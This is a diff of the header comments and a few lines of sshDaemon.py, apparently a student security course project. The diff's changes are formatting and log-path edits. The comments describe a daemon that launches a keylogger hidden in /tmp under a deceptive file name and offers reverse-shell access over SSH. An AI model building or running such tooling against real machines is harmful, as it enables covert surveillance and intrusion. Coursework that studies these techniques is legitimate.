@@ -2,14 +2,14 @@
 
 # ==============================================================================
 #      Assignment:  DPI912 Term Project
-#      File: SSH Client
+#      File: SSH Daemon
 #
 #      Authors: Sang Min Park, Jacky Tea
 #      Student ID (Sang Min Park): 124218173
 #      Student ID (Jacky Tea): 152078168
 #      Language: Python3
 #      Libraries Used: paramiko, socket, os, time, logzero,
-#      threading, subprocess, sys, atexit, signal
+#      threading, subprocess, sys, atexit, signal, json
 #
 #      To compile with python3 >>> python3 sshDaemon.py -status start
 #      To compile with executable >>> chmod 700 sshDaemon.py
@@ -29,13 +29,14 @@
 #      for an awaiting client over SSH to execute via a reverse-shell scheme.
 #
 #      Input:  A command line argument of either '-status start' or '-status stop'. For example:
-#      ./sshDaemon.py -status start. '-status start' will execute the key logger, ' -status stop' will
-#      kill its background process.
+#      ./sshDaemon.py -status start. '-status start' will execute the key logger, ' -status stop'
+#      will kill its background process.
 #
 #      Output: A file called in 'sshDaemon.log' in the current directory containing
 #      error messages and information such as received messages over the SSH connection.
 #      A file called ZZZZ_NOT_SUSPICIOUS_FILE is generated in /tmp which holds the keylogger
-#      program. A file called '/tmp/sshDaemon.pid' is generated to keep track of the running process.
+#      program. A file called '/tmp/sshDaemon.pid' is generated to keep track of
+#      the running process.
 #
 #      Algorithm: Once a status is received, the daemon checks if there is the existence
 #      of a pid file to see if the daemon instance is already running. If there is one, an
@@ -323,7 +324,8 @@ def serverForever(commandArgs, pathDirectory):
 
     logger.info('Server HTTP on port {address} ...'.format(address=address))
 
-    # event handler - when child dies, returns the signal SIGCHILD, grim_reaper then cleans it up to prevent zombies
+    # event handler - when child dies, returns the signal SIGCHILD,
+    # grim_reaper then cleans it up to prevent zombies
     signal.signal(signal.SIGCHLD,  grimReaper)
 
     while True:
@@ -378,7 +380,7 @@ if __name__ == '__main__':
     commandArgs = parseCmdArgument()
 
     # Add logging to logfile and disable output to the terminal
-    logzero.logfile("/tmp/sshDaemon.log", maxBytes=1e6,
+    logzero.logfile("sshDaemon.log", maxBytes=1e6,
                     backupCount=3, disableStderrLogger=True)
 
     # Start server process
